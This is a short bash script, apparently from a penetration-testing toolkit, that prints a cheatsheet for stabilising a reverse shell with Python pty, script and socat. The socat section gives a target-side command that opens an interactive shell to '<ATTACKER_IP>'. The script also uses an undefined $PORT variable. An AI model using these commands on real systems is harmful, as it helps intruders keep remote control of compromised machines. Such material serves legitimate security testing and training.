#!/bin/bash
set -euo pipefail
# /usr/local/bin/revshell-stabilize
# Reverse shell stabilization cheatsheet
# Usage: revshell-stabilize

echo "[*] ZERO-DAY OS — Shell Stabilization Cheatsheet"
echo ""
echo "=== Method 1: Python PTY ==="
echo "1. python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
echo "2. Ctrl+Z"
echo "3. stty raw -echo; fg"
echo "4. export TERM=xterm"
echo ""
echo "=== Method 2: Script (no Python) ==="
echo "1. script /dev/null -qc /bin/bash"
echo "2. Ctrl+Z"
echo "3. stty raw -echo; fg"
echo "4. export TERM=xterm"
echo ""
echo "=== Method 3: Socat (full TTY) ==="
echo "# On attacker:"
echo "  socat file:\$(tty),raw,echo=0 tcp-listen:$PORT"
echo "# On target:"
echo "  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER_IP>:$PORT"
echo ""
echo "=== Fix Terminal Size ==="
echo "1. Get your terminal size: stty size"
echo "2. In reverse shell: stty rows <ROWS> cols <COLS>"
echo ""
echo "=== Useful After Stabilization ==="
echo "  export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin"
echo "  export SHELL=/bin/bash"
echo "  export TERM=xterm-256color"
echo "  alias ll='ls -la'"
echo "  source /etc/bash_completion 2>/dev/null"